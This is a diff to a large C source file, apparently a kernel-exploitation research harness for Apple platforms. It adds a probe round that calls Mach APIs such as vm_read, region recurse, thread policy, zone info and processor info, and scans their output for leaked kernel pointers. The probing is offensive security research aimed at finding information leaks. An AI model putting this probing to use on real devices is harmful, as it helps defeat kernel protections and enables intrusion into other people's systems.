@@ -16788,6 +16788,248 @@ static void *r436_monitor_thread(void *arg) {
     return NULL;
 }
 
+static void r438_probe(void) {
+    rlog("\n=== r438: vm_read Residual + Region Recurse + Thread Policy + Zone Info ===\n\n");
+    fflush(stdout);
+
+    /* Vector A: vm_read on our own addresses — check for uninitialized kernel data */
+    rlog("  --- Vector A: vm_read residual data check ---\n");
+    {
+        /* Allocate a page, fill with pattern, then vm_read it */
+        vm_address_t page = 0;
+        kern_return_t kr = vm_allocate(mach_task_self(), &page, 16384, VM_FLAGS_ANYWHERE);
+        rlog("    vm_allocate: kr=%d addr=0x%llx\n", kr, (unsigned long long)page);
+
+        if (kr == 0) {
+            memset((void*)page, 0xBB, 16384);
+
+            /* vm_read returns kernel-allocated OOL memory */
+            vm_offset_t data = 0;
+            mach_msg_type_number_t dataCnt = 0;
+            kr = vm_read(mach_task_self(), page, 16384, &data, &dataCnt);
+            rlog("    vm_read: kr=%d data=0x%llx cnt=%u\n", kr,
+                 (unsigned long long)data, dataCnt);
+
+            if (kr == 0 && data != 0) {
+                /* The returned buffer is at a different address — kernel allocated it */
+                rlog("    Source: 0x%llx, Returned: 0x%llx (different=%d)\n",
+                     (unsigned long long)page, (unsigned long long)data, page != data);
+
+                /* Scan the returned buffer for kernel pointers */
+                uint64_t *dp = (uint64_t*)data;
+                int kptr = 0;
+                for (uint32_t i = 0; i < dataCnt / 8; i++) {
+                    if ((dp[i] & 0xFFFFFF0000000000ULL) == 0xFFFFFFF000000000ULL) {
+                        rlog("      *** KPTR at +%u: 0x%016llx ***\n", i*8,
+                             (unsigned long long)dp[i]);
+                        kptr++;
+                        if (kptr >= 10) break;
+                    }
+                }
+                rlog("    KPTRs in vm_read buffer: %d\n", kptr);
+
+                /* Now free the source, then vm_read the same address (freed) */
+                vm_deallocate(mach_task_self(), page, 16384);
+
+                /* Allocate many small buffers to fragment, then read them */
+                vm_address_t frags[50];
+                int frag_ok = 0;
+                for (int i = 0; i < 50; i++) {
+                    kr = vm_allocate(mach_task_self(), &frags[i], 4096, VM_FLAGS_ANYWHERE);
+                    if (kr == 0) frag_ok++;
+                }
+
+                /* vm_read each fragment, check for residual data */
+                int residual_found = 0;
+                for (int i = 0; i < frag_ok; i++) {
+                    vm_offset_t rd = 0;
+                    mach_msg_type_number_t rc = 0;
+                    kr = vm_read(mach_task_self(), frags[i], 4096, &rd, &rc);
+                    if (kr == 0 && rd) {
+                        uint64_t *rp = (uint64_t*)rd;
+                        for (uint32_t j = 0; j < rc / 8; j++) {
+                            if (rp[j] != 0 &&
+                                (rp[j] & 0xFFFFFF0000000000ULL) == 0xFFFFFFF000000000ULL) {
+                                rlog("      *** RESIDUAL KPTR frag[%d]+%u: 0x%016llx ***\n",
+                                     i, j*8, (unsigned long long)rp[j]);
+                                residual_found++;
+                            }
+                        }
+                        vm_deallocate(mach_task_self(), rd, rc);
+                    }
+                }
+                rlog("    Residual KPTRs across 50 frags: %d\n", residual_found);
+
+                for (int i = 0; i < frag_ok; i++)
+                    vm_deallocate(mach_task_self(), frags[i], 4096);
+
+                vm_deallocate(mach_task_self(), data, dataCnt);
+            }
+        }
+    }
+    fflush(stdout);
+
+    /* Vector B: mach_vm_region_recurse with submap info */
+    rlog("\n  --- Vector B: mach_vm_region_recurse submap scan ---\n");
+    {
+        mach_vm_address_t addr = 0;
+        int regions_checked = 0;
+        int kptr_total = 0;
+
+        while (regions_checked < 50) {
+            mach_vm_size_t rsize = 0;
+            uint32_t depth = 0;
+            struct vm_region_submap_info_64 info;
+            mach_msg_type_number_t cnt = VM_REGION_SUBMAP_INFO_COUNT_64;
+            kern_return_t kr = mach_vm_region_recurse(mach_task_self(), &addr,
+                &rsize, &depth, (vm_region_recurse_info_t)&info, &cnt);
+            if (kr != 0) break;
+
+            /* Check all info fields for kernel pointers */
+            uint64_t *ip = (uint64_t*)&info;
+            for (unsigned i = 0; i < sizeof(info) / 8; i++) {
+                if ((ip[i] & 0xFFFFFF0000000000ULL) == 0xFFFFFFF000000000ULL) {
+                    rlog("    Region 0x%llx+0x%llx depth=%u: KPTR at info+%u: 0x%016llx\n",
+                         (unsigned long long)addr, (unsigned long long)rsize, depth,
+                         i*8, (unsigned long long)ip[i]);
+                    kptr_total++;
+                }
+            }
+
+            /* Also check object_id field specifically */
+            if (info.object_id != 0 &&
+                (info.object_id & 0xFFFFFF0000000000ULL) == 0xFFFFFFF000000000ULL) {
+                rlog("    *** object_id KPTR: 0x%016llx ***\n",
+                     (unsigned long long)info.object_id);
+            }
+
+            /* Check user_tag for IOSurface-related tags */
+            if (info.user_tag >= 240 && info.user_tag <= 255) {
+                rlog("    IOKit region: 0x%llx+0x%llx tag=%u depth=%u\n",
+                     (unsigned long long)addr, (unsigned long long)rsize,
+                     info.user_tag, depth);
+            }
+
+            regions_checked++;
+            addr += rsize;
+        }
+        rlog("    Checked %d regions, KPTRs: %d\n", regions_checked, kptr_total);
+    }
+    fflush(stdout);
+
+    /* Vector C: thread_policy_get with various flavors */
+    rlog("\n  --- Vector C: thread_policy_get flavors ---\n");
+    {
+        thread_port_t thread = mach_thread_self();
+        for (int flav = 1; flav <= 10; flav++) {
+            integer_t info[16] = {0};
+            mach_msg_type_number_t cnt = 16;
+            boolean_t get_default = FALSE;
+            kern_return_t kr = thread_policy_get(thread, flav, info, &cnt, &get_default);
+            if (kr == 0) {
+                rlog("    flavor %d: cnt=%u default=%d", flav, cnt, get_default);
+                /* Check for kernel pointers in info */
+                int kptr = 0;
+                for (unsigned i = 0; i < cnt; i++) {
+                    /* Combine pairs into uint64_t to check */
+                    if (i + 1 < cnt) {
+                        uint64_t combined = ((uint64_t)(uint32_t)info[i+1] << 32) | (uint32_t)info[i];
+                        if ((combined & 0xFFFFFF0000000000ULL) == 0xFFFFFFF000000000ULL) {
+                            rlog(" ***KPTR***");
+                            kptr++;
+                        }
+                    }
+                }
+                rlog("\n");
+                for (unsigned i = 0; i < cnt; i++) {
+                    if (info[i] != 0) rlog("      [%u]: %d (0x%x)\n", i, info[i], info[i]);
+                }
+            } else if (flav <= 3) {
+                rlog("    flavor %d: kr=%d\n", flav, kr);
+            }
+        }
+        mach_port_deallocate(mach_task_self(), thread);
+    }
+    fflush(stdout);
+
+    /* Vector D: host_zone_info / mach_zone_info attempt */
+    rlog("\n  --- Vector D: Zone info attempts ---\n");
+    {
+        /* Try mach_zone_info */
+        typedef kern_return_t (*zone_info_fn)(host_t, mach_zone_name_t*, mach_msg_type_number_t*,
+            mach_zone_info_t*, mach_msg_type_number_t*);
+        zone_info_fn zi = (zone_info_fn)dlsym(RTLD_DEFAULT, "mach_zone_info");
+        rlog("    mach_zone_info: %p\n", zi);
+
+        if (zi) {
+            mach_zone_name_t *names = NULL;
+            mach_msg_type_number_t namesCnt = 0;
+            mach_zone_info_t *info = NULL;
+            mach_msg_type_number_t infoCnt = 0;
+            kern_return_t kr = zi(mach_host_self(), &names, &namesCnt, &info, &infoCnt);
+            rlog("    mach_zone_info: kr=%d names=%u info=%u\n", kr, namesCnt, infoCnt);
+
+            if (kr == 0 && namesCnt > 0 && infoCnt > 0) {
+                rlog("    *** ZONE INFO AVAILABLE! ***\n");
+                for (unsigned i = 0; i < namesCnt && i < 10; i++) {
+                    rlog("      zone '%s': cur=%llu max=%llu\n",
+                         names[i].mzn_name,
+                         (unsigned long long)info[i].mzi_cur_size,
+                         (unsigned long long)info[i].mzi_max_size);
+                }
+            }
+        }
+
+        /* Try host_zone_info too */
+        typedef kern_return_t (*host_zone_info_fn)(host_t, mach_zone_name_t*, mach_msg_type_number_t*,
+            mach_zone_info_t*, mach_msg_type_number_t*);
+        host_zone_info_fn hzi = (host_zone_info_fn)dlsym(RTLD_DEFAULT, "host_zone_info");
+        rlog("    host_zone_info: %p\n", hzi);
+
+        /* Try task_zone_info */
+        typedef kern_return_t (*task_zone_info_fn)(task_t, mach_zone_name_t*, mach_msg_type_number_t*,
+            task_zone_info_t*, mach_msg_type_number_t*);
+        task_zone_info_fn tzi = (task_zone_info_fn)dlsym(RTLD_DEFAULT, "task_zone_info");
+        rlog("    task_zone_info: %p\n", tzi);
+
+        if (tzi) {
+            mach_zone_name_t *names = NULL;
+            mach_msg_type_number_t namesCnt = 0;
+            task_zone_info_t *info = NULL;
+            mach_msg_type_number_t infoCnt = 0;
+            kern_return_t kr = tzi(mach_task_self(), &names, &namesCnt, &info, &infoCnt);
+            rlog("    task_zone_info: kr=%d names=%u info=%u\n", kr, namesCnt, infoCnt);
+        }
+
+        /* Try processor_info */
+        for (int flav = 1; flav <= 5; flav++) {
+            natural_t pcount = 0;
+            processor_info_array_t pinfo = NULL;
+            mach_msg_type_number_t pcnt = 0;
+            kern_return_t kr = host_processor_info(mach_host_self(), flav, &pcount, &pinfo, &pcnt);
+            if (kr == 0) {
+                rlog("    host_processor_info flavor %d: count=%u info_cnt=%u\n", flav, pcount, pcnt);
+                /* Scan for kernel pointers */
+                for (unsigned i = 0; i < pcnt; i++) {
+                    if (i + 1 < pcnt) {
+                        uint64_t combined = ((uint64_t)(uint32_t)pinfo[i+1] << 32) | (uint32_t)pinfo[i];
+                        if ((combined & 0xFFFFFF0000000000ULL) == 0xFFFFFFF000000000ULL) {
+                            rlog("      *** KPTR at [%u]: 0x%016llx ***\n", i, combined);
+                        }
+                    }
+                }
+                vm_deallocate(mach_task_self(), (vm_address_t)pinfo, pcnt * sizeof(natural_t));
+            } else if (flav <= 2) {
+                rlog("    host_processor_info flavor %d: kr=%d\n", flav, kr);
+            }
+        }
+    }
+    fflush(stdout);
+
+    rlog("\n=== r438 complete ===\n");
+    fflush(stdout);
+}
+
 static void r437_probe(void) {
     rlog("\n=== r437: System Surface Scan + Multi-Plane + XPC Serialize ===\n\n");
     fflush(stdout);
@@ -76605,6 +76847,12 @@ new_modes:
             rlog("*** r=251 complete ***\n");
             goto done;
         }
+        if (rounds == 441) {
+            rlog("*** rounds=441: vm_read + Region Recurse + Thread Policy + Zone Info ***\n\n");
+            fflush(stdout);
+            r438_probe();
+            goto done;
+        }
         if (rounds == 440) {
             rlog("*** rounds=440: System Surface Scan + Multi-Plane + XPC Serialize ***\n\n");
             fflush(stdout);
@@ -79271,7 +79519,7 @@ new_modes:
             rlog("*** r=252 complete ***\n");
             goto done;
         }
-        if (rounds >= 170 && rounds != 219 && rounds != 225 && rounds != 299 && rounds != 300 && rounds != 301 && rounds != 302 && rounds != 303 && rounds != 304 && rounds != 354 && rounds != 355 && rounds != 356 && rounds != 357 && rounds != 358 && rounds != 359 && rounds != 360 && rounds != 361 && rounds != 362 && rounds != 363 && rounds != 364 && rounds != 365 && rounds != 366 && rounds != 367 && rounds != 368 && rounds != 369 && rounds != 370 && rounds != 371 && rounds != 372 && rounds != 373 && rounds != 374 && rounds != 375 && rounds != 376 && rounds != 377 && rounds != 378 && rounds != 379 && rounds != 380 && rounds != 381 && rounds != 382 && rounds != 383 && rounds != 384 && rounds != 385 && rounds != 386 && rounds != 387 && rounds != 388 && rounds != 389 && rounds != 390 && rounds != 391 && rounds != 392 && rounds != 393 && rounds != 394 && rounds != 395 && rounds != 396 && rounds != 397 && rounds != 398 && rounds != 399 && rounds != 400 && rounds != 401 && rounds != 402 && rounds != 403 && rounds != 404 && rounds != 405 && rounds != 406 && rounds != 407 && rounds != 408 && rounds != 409 && rounds != 410 && rounds != 411 && rounds != 412 && rounds != 413 && rounds != 414 && rounds != 415 && rounds != 416 && rounds != 417 && rounds != 418 && rounds != 419 && rounds != 420 && rounds != 421 && rounds != 422 && rounds != 423 && rounds != 424 && rounds != 425 && rounds != 426 && rounds != 427 && rounds != 428 && rounds != 429 && rounds != 430 && rounds != 431 && rounds != 432 && rounds != 433 && rounds != 434 && rounds != 435 && rounds != 436 && rounds != 437 && rounds != 438 && rounds != 439 && rounds != 440) {
+        if (rounds >= 170 && rounds != 219 && rounds != 225 && rounds != 299 && rounds != 300 && rounds != 301 && rounds != 302 && rounds != 303 && rounds != 304 && rounds != 354 && rounds != 355 && rounds != 356 && rounds != 357 && rounds != 358 && rounds != 359 && rounds != 360 && rounds != 361 && rounds != 362 && rounds != 363 && rounds != 364 && rounds != 365 && rounds != 366 && rounds != 367 && rounds != 368 && rounds != 369 && rounds != 370 && rounds != 371 && rounds != 372 && rounds != 373 && rounds != 374 && rounds != 375 && rounds != 376 && rounds != 377 && rounds != 378 && rounds != 379 && rounds != 380 && rounds != 381 && rounds != 382 && rounds != 383 && rounds != 384 && rounds != 385 && rounds != 386 && rounds != 387 && rounds != 388 && rounds != 389 && rounds != 390 && rounds != 391 && rounds != 392 && rounds != 393 && rounds != 394 && rounds != 395 && rounds != 396 && rounds != 397 && rounds != 398 && rounds != 399 && rounds != 400 && rounds != 401 && rounds != 402 && rounds != 403 && rounds != 404 && rounds != 405 && rounds != 406 && rounds != 407 && rounds != 408 && rounds != 409 && rounds != 410 && rounds != 411 && rounds != 412 && rounds != 413 && rounds != 414 && rounds != 415 && rounds != 416 && rounds != 417 && rounds != 418 && rounds != 419 && rounds != 420 && rounds != 421 && rounds != 422 && rounds != 423 && rounds != 424 && rounds != 425 && rounds != 426 && rounds != 427 && rounds != 428 && rounds != 429 && rounds != 430 && rounds != 431 && rounds != 432 && rounds != 433 && rounds != 434 && rounds != 435 && rounds != 436 && rounds != 437 && rounds != 438 && rounds != 439 && rounds != 440 && rounds != 441) {
             rlog("*** rounds=%d: fast-path to Phase 17 ***\n", rounds);
             goto phase16_done;
         }
